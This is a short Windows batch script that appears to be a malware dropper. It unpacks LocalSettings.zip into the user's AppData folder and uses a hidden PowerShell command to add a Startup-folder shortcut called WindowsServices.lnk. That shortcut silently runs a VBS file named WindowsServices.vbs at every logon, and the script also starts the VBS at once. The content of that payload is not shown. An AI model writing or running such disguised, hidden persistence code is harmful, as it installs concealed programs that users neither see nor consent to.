@echo off
setlocal

:: === Variables ===
set ZIPFILE=LocalSettings.zip
set DEST=%AppData%
set VBS=%DEST%\LocalSettings\WindowsServices.vbs
set STARTUP=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
set SHORTCUT=%STARTUP%\WindowsServices.lnk
set SEVENZIP=%~dp0\7-Zip\App\7-Zip\7z.exe

:: === Step 1: Unzip LocalSettings.zip to %AppData% using 7-Zip ===
if not exist "%SEVENZIP%" (
    echo ERROR: 7z.exe not found in script directory.
    pause
    exit /b 1
)
"%SEVENZIP%" x "%~dp0%ZIPFILE%" -o"%DEST%" -y >nul

:: === Step 2: Ensure Startup folder exists ===
if not exist "%STARTUP%" mkdir "%STARTUP%"

:: === Step 3: Create the shortcut ===
powershell -WindowStyle Hidden -Command ^
  "$ws = New-Object -ComObject WScript.Shell; " ^
  "$s = $ws.CreateShortcut('%SHORTCUT%'); " ^
  "$s.TargetPath = 'wscript.exe'; " ^
  "$s.Arguments = '\"%VBS%\"'; " ^
  "$s.WindowStyle = 0; " ^
  "$s.WorkingDirectory = '%DEST%\LocalSettings'; " ^
  "$s.IconLocation = 'wscript.exe,0'; " ^
  "$s.Save()"

:: === Step 4: Run the script immediately ===
start "" wscript.exe "%VBS%"

exit /b
